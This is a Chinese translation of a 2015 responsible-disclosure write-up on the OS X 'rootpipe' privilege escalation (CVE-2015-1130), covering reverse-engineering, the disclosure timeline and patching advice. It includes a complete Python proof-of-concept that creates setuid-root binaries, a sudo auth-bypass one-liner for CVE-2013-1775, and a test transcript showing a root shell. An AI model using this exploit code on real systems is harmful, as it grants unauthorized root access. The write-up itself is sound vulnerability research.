# Apple OS X系统中存在可以提升root权限的API后门

from:https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/

0x00 摘要
=======

* * *

Apple OS X系统中的Admin框架存在可以提升root权限的API后门，并且已经存在多年（至少是从2011年开始）。我是在2014年的10月发现他可以被用来已任何用户权限提升为root权限，其本意可能是要服务“System Preferences”和systemsetup（命令行工具），但是所有的用户进程可以使用相同的功能。

苹果刚刚发布了OS X 10.10.3解决了此问题，但是OS X 10.9.x以及之前的版本存在此问题，因为苹果决定不对这些版本进行修复了。我们建议所有的用户都升级到10.10.3。

0x01 demo
=========

* * *

我使用的第一个exp是基于CVE-2013-1775的，一个sudo认证绕过bug，这个bug已经在10.8.5（2013年9月）修复了。

exp代码非常的简单：

```
$ sudo -k;systemsetup -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00;sudo su

```

我跟我同事Philip Åkesson聊这个exp代码实际上使用了systemsetup来修改系统时间。我们一起来看了下他修复的细节，原来除了修复了sudo，Apple也同时做了另外一件事情，他们把systemsetup设置为需要root权限，当以非root权限执行systemsetup的时候，下面的信息就会显示（在10.8.5以及之后版本）：

```
$ systemsetup
You need administrator access to run this tool... exiting!

```

这个消息其实是有点误导的，以为我们实际上是在以管理员权限运行，安装OS X时候创建的用户默认就是admin权限。

总之，上面的消息表明执行该命令需要root权限，通过Hopper反汇编发现了下面的代码

![enter image description here](http://drops.javaweb.org/uploads/images/8174cf436acde03ed1a19e8349afdeb4df92c081.jpg)

OK，所以systemsetup二进制文件只是简单的检查了是否是root权限。

修改了一下函数（用setne替代sete）：取得了成功

```
$ systemsetup
> systemsetup
> type -help for help.

```

到目前为止，我们只是回到之前的systemsetup（10.8.5之前），你可以用systemsetup执行命令的一个例子：

```
$ systemsetup –setremotelogin on

```

这将在22端口上开启ssh服务，当然你也可以通过launchtl开启，但是launchtl需要root权限。所以这在权限上还是有很明显的区别的。

类名为RemoteServerSettings表明，有某种进程间通信可以解释为什么需要root操作执行。不过还是要提一下，通过System Preferences开启SSH服务也不需要root权限。

我发现这种权限的差异非常有趣，继续反编译systemsetup。

通过一个名字叫做[ServerSettings setRemoteLogin:]的方法实现了systemsetup中的setremotelogin命令。

函数做了一些输入检查，然后调用[InternetServices setSSHServerEnabled:]，这是在Admin框架中实现。反编译Admin框架可以看到setSSHServerEnabled并不是InternetServices接口的唯一方法，清单如下：

```
+[InternetServices sharedInternetServices]
+[InternetServices sharedInternetServices].sSharedInternetServices
-[InternetServices _netFSServerFrameworkBundle]
-[InternetServices _netFSServerFrameworkBundle].sNetFSServerkBundle
-[InternetServices _netFSServerFrameworkBundle].sNetFSServerkBundleOnce
-[InternetServices faxReceiveEnabled]
-[InternetServices ftpServerEnabled]
-[InternetServices httpdEnabled]
-[InternetServices isFTPServerAvailable]
-[InternetServices isFaxReceiveAvailable]
-[InternetServices isGuestForProtocolEnabled:]
-[InternetServices isHttpdAvailable]
-[InternetServices isNSCProtocolAvailable:]
-[InternetServices isNSCProtocolEnabled:]
-[InternetServices isNSServerShuttingDown:]
-[InternetServices isOpticalDiscSharingEnabled]
-[InternetServices isRemoteAEServerAvailable]
-[InternetServices isSSHServerAvailable]
-[InternetServices nscServerCancelShutdown:refNum:]
-[InternetServices nscServerShutdown:withDelay:]
-[InternetServices numberOfClientsForProtocols:]
-[InternetServices remoteAEServerEnabled]
-[InternetServices saveNatPrefs:]
-[InternetServices screensharingEnabled]
-[InternetServices sendSIGHUPToEfax]
-[InternetServices setFTPServerEnabled:]
-[InternetServices setFaxReceiveEnabled:]
-[InternetServices setGuestForProtocol:enabled:]
-[InternetServices setHttpdEnabled:]
-[InternetServices setInetDServiceEnabled:enabled:]
-[InternetServices setNSCProtocols:enabled:]
-[InternetServices setOpticalDiscSharingEnabled:]
-[InternetServices setRemoteAEServerEnabled:]
-[InternetServices setSSHServerEnabled:]
-[InternetServices setScreensharingEnabled:]
-[InternetServices sshServerEnabled]
_OBJC_CLASS_$_InternetServices
_OBJC_METACLASS_$_InternetServices
___47-[InternetServices _netFSServerFrameworkBundle]_block_invoke

```

一些例如setHttpdEnabled和setSSHServerEnabled共享一个辅助方法[ADMInternetServices setInetDServiceEnabled:enabled:]。

继续看Admin框架代码，发现：

![enter image description here](http://drops.javaweb.org/uploads/images/3c17d0918703e61de50e2466c90c8d4f44fe3bdc.jpg)

代码看来是为guest账户创建一个用户特定的Apache配置文件，注意root用户是这个文件的拥有者：

```
$ ls -l /etc/apache2/users/
total 8
-rw-r--r-- 1 root wheel 139 Apr 1 05:49 std.conf

```

0x02 发现后门
=========

* * *

上面截图的代码中最后一个被调用的Objective-C方法是createFileWithContents:path:attributes:

他获取一个组数组包括字节数，文件路径，文件属性。

自己代码中使用这个函数是这个样子的：

```
[tool createFileWithContents:data
                        path:[NSString stringWithUTF8String:target]
                  attributes:@{ NSFilePosixPermissions : @0777 }];

```

问题在于我们如何控制“tool”，再看一看开始的代码截图：

```
id sharedClient =
    [objc_lookUpClass("WriteConfigClient") sharedClient];
id tool = [sharedClient remoteProxy];

```

当我尝试我自己的代码的时候，爆出error错误：

```
### Attempt to send message without connection!

```

下面找出如何出现这个错误的：

![enter image description here](http://drops.javaweb.org/uploads/images/01e195997618490f6f5e629cc2513e187f457c59.jpg)

这是检查XPC代理在我的进程中是否启动，看一下_onewayMessageDispatcher来定位初始代码：

![enter image description here](http://drops.javaweb.org/uploads/images/a4f0a520a38d20bdcd50ce64a987a67f8a273afb.jpg)

实际初始化的地方就是authenticateUsingAuthorization方法。

![enter image description here](http://drops.javaweb.org/uploads/images/5fb0b2a972e3c6865692ed9d6e53dd3d03dcc97d.jpg)

这正是我想要的，给writeconfig XPC服务创建一个XPC客户端，并且这个服务是以root权限运行的。

![enter image description here](http://drops.javaweb.org/uploads/images/35b11393dbcd62c54ebaf77e411afdcc4e572f7f.jpg)

唯一的问题就是我应该给authenticateUsingAuthorization传递什么参数，从systemsetup文件当中找到如下：

![enter image description here](http://drops.javaweb.org/uploads/images/0bf702426dc10c2eaed281b82551ec246429c6b9.jpg)

看起来[SFAuthorization authorization]可以来做触发，下面是我的新的exp：

```
id auth = [objc_lookUpClass("SFAuthorization") authorization];
id sharedClient =
    [objc_lookUpClass("WriteConfigClient") sharedClient];
[sharedClient authenticateUsingAuthorizationSync: auth];
id tool = [sharedClient remoteProxy];

[tool createFileWithContents:data
                        path:[NSString stringWithUTF8String:target]
                  attributes:@{ NSFilePosixPermissions : @04777 }];

```

文件最终创建，setuid已经设置：

```
-rwsrwxrwx 1 root wheel 25960 Apr 1 19:29 rootpipe.tmp

```

既然setuid已经设置并且拥有者是root，我们就有有了一个提权漏洞。

上面的代码适用于10.9及以后版本，10.7.x和10.8.x有些类文件名略不相同。

但是上面的代码仍然有一个问题，只可以在admin的权限下运行，之前提到过几乎所有的OS X用户都是admin。

最终找到一个适用所有用户使用的方法，很简单，只要把[SFAuthorization authorization]:的结果替换为发送nil到authenticateUsingAuthorizationSync。

```
[sharedClient authenticateUsingAuthorizationSync: nil];

```

0x03 Timeline
=============

* * *

```
Oct 2nd 2014: First discovery
Oct 3rd 2014: First contact with Apple Product Security Team
Oct 14th 2014: Exploit code shared with Apple
Oct 24th 2014: Initial full disclosure date set to Jan 12th 2015
Oct 16th 2014: Release of OS X 10.10 Yosemite, vulnerable to rootpipe
Nov 14th 2014: Apple requested to postpone disclosure
Nov 17th 2014: Release of OS X 10.10.1, also vulnerable
Jan 12th 2015: Joint decision between Apple and TrueSec to postpone disclosure due to the amount of changes required in OS X
Jan 16th 2015: CVE-2015-1130 created by Apple
Jan 27th 2015: Release of OS X 10.10.2, also vulnerable
March 2nd 2015: Release of OS X 10.10.3 public beta, issue solved
April 1st 2015: Apple confirmed that release is coming the second week of April
April 8th 2015: Release of OS X 10.10.3
April 9th 2015: Full disclosure

```

0x04 EXP
========

* * *

```
########################################################
#
#  PoC exploit code for rootpipe (CVE-2015-1130)
#
#  Created by Emil Kvarnhammar, TrueSec
#
#  Tested on OS X 10.7.5, 10.8.2, 10.9.5 and 10.10.2
#
########################################################
import os
import sys
import platform
import re
import ctypes
import objc
import sys
from Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions
from Foundation import NSAutoreleasePool

def load_lib(append_path):
    return ctypes.cdll.LoadLibrary("/System/Library/PrivateFrameworks/" + append_path);

def use_old_api():
    return re.match("^(10.7|10.8)(.\d)?$", platform.mac_ver()[0])


args = sys.argv

if len(args) != 3:
    print "usage: exploit.py source_binary dest_binary_as_root"
    sys.exit(-1)

source_binary = args[1]
dest_binary = os.path.realpath(args[2])

if not os.path.exists(source_binary):
    raise Exception("file does not exist!")

pool = NSAutoreleasePool.alloc().init()

attr = NSMutableDictionary.alloc().init()
attr.setValue_forKey_(04777, NSFilePosixPermissions)
data = NSData.alloc().initWithContentsOfFile_(source_binary)

print "will write file", dest_binary

if use_old_api():
    adm_lib = load_lib("/Admin.framework/Admin")
    Authenticator = objc.lookUpClass("Authenticator")
    ToolLiaison = objc.lookUpClass("ToolLiaison")
    SFAuthorization = objc.lookUpClass("SFAuthorization")

    authent = Authenticator.sharedAuthenticator()
    authref = SFAuthorization.authorization()

    # authref with value nil is not accepted on OS X <= 10.8
    authent.authenticateUsingAuthorizationSync_(authref)
    st = ToolLiaison.sharedToolLiaison()
    tool = st.tool()
    tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
else:
    adm_lib = load_lib("/SystemAdministration.framework/SystemAdministration")
    WriteConfigClient = objc.lookUpClass("WriteConfigClient")
    client = WriteConfigClient.sharedClient()
    client.authenticateUsingAuthorizationSync_(None)
    tool = client.remoteProxy()

    tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)


print "Done!"

del pool

```

0x05 译者测试
=========

* * *

```
[test@test:~]$ cp /bin/bash bashceshi 
[test@test:~]$ python CVE-2013-1775.py bashceshi bashroot
will write file /Users/test/Downloads/bashroot 
Done! 
[test@test:~]$ ./bashroot -p
bashroot-3.2# id
uid=501(test) gid=20(staff) euid=0(root) groups=20(staff),501(access_bpf),402(com.apple.sharepoint.group.1),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),33(_appstore),100(_lpoperator),204(_developer),398(com.apple.access_screensharing),399(com.apple.access_ssh)

```